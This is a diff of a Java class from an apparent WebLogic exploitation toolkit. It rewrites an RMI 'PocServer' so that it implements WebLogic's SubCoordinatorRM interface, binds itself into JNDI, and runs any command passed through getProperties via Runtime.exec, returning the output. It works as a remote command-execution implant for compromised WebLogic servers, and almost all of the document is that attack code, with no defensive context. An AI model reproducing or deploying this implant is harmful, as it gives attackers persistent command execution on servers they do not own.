@@ -1,21 +1,23 @@
-package com.r4v3zn.weblogic.tools;
+import weblogic.transaction.internal.SubCoordinatorRM;
 
-import weblogic.cluster.singleton.ClusterMasterRemote;
 import javax.naming.Context;
 import javax.naming.InitialContext;
 import java.io.*;
 import java.rmi.RemoteException;
+import java.util.HashMap;
+import java.util.Map;
 
 /**
- * Title: RmiPocServer
- * Descrption: RmiPocServer
- * Date:2020/3/22 0:36
+ * Title: PocServerSubCoordinatorRM
+ * Desc: TODO
+ * Date:2020/4/3 19:33
  * Email:woo0nise@gmail.com
- * Company:www.r4v3zn.com
+ * Company:www.j2ee.app
+ *
  * @author R4v3zn
  * @version 1.0.0
  */
-public class RmiPocServer implements ClusterMasterRemote {
+public class PocServerSubCoordinatorRM implements SubCoordinatorRM {
 
     /**
      * rmi bind
@@ -24,7 +26,7 @@ public class RmiPocServer implements ClusterMasterRemote {
      */
     public void rmiBind(String clientName) {
         try {
-            RmiPocServer rmiServer = new RmiPocServer();
+            PocServerSubCoordinatorRM rmiServer = new PocServerSubCoordinatorRM();
             Context context = new InitialContext();
             context.rebind(clientName, rmiServer);
         } catch (Exception e) {
@@ -32,36 +34,38 @@ public class RmiPocServer implements ClusterMasterRemote {
         }
     }
 
-    public static void main(String[] args) {
-        RmiPocServer pocServer = new RmiPocServer();
-        String clientName = args[0];
-        pocServer.rmiBind(clientName);
-    }
-
     @Override
-    public void setServerLocation(String s, String s1) throws RemoteException {
-
-    }
-
-    @Override
-    public String getServerLocation(String cmd) throws RemoteException {
+    public Map getProperties(String cmd) {
         String[] splitArr = cmd.split("@@");
         cmd = splitArr[0];
-        String os = splitArr[1];
-        os = os.trim().toLowerCase();
-        return execCmd(cmd, os);
+        String charsetName = splitArr[1];
+        charsetName = charsetName.trim().toUpperCase();
+        Map<String, String> result = new HashMap<>(16);
+        result.put("data", execCmd(cmd, charsetName));
+        return result;
     }
 
     /**
      * 执行命令
      * @param cmd 执行命令
-     * @param clientOs 客户端操作系统
+     * @param charsetName 编码
      * @return 执行结果
      * @throws RemoteException
      */
-    public String execCmd(String cmd, String clientOs) throws RemoteException {
+    public String execCmd(String cmd, String charsetName){
         if(cmd == null || "".equals(cmd)){
             return "commond not null";
+        }
+        if("".equals(charsetName) || charsetName ==null){
+            charsetName = "UTF-8";
+        }
+        charsetName = charsetName.trim();
+        if(charsetName.toUpperCase().equals("UTF-8")){
+            charsetName = "UTF-8";
+        }else if(charsetName.toUpperCase().equals("GBK")){
+            charsetName = "GBK";
+        }else{
+            charsetName = "UTF-8";
         }
         cmd = cmd.trim();
         StringBuilder result = new StringBuilder();
@@ -85,13 +89,8 @@ public class RmiPocServer implements ClusterMasterRemote {
         try {
             process = Runtime.getRuntime().exec(executeCmd);
             process.waitFor();
-            if (clientOs.contains("windows")){
-                bufrIn = new BufferedReader(new InputStreamReader(process.getInputStream(), "GBK"));
-                bufrError = new BufferedReader(new InputStreamReader(process.getErrorStream(), "GBK"));
-            }else{
-                bufrIn = new BufferedReader(new InputStreamReader(process.getInputStream(), "UTF-8"));
-                bufrError = new BufferedReader(new InputStreamReader(process.getErrorStream(), "UTF-8"));
-            }
+            bufrIn = new BufferedReader(new InputStreamReader(process.getInputStream(), charsetName));
+            bufrError = new BufferedReader(new InputStreamReader(process.getErrorStream(), charsetName));
             String line = null;
             while ((line = bufrIn.readLine()) != null) {
                 result.append(line).append('\n');
@@ -117,12 +116,14 @@ public class RmiPocServer implements ClusterMasterRemote {
         }
     }
 
-    private static void closeStream(Closeable stream) {
+    private void closeStream(Closeable stream) {
         if (stream != null) {
             try {
                 stream.close();
             } catch (Exception e) {
+                // TODO:
             }
         }
     }
+
 }
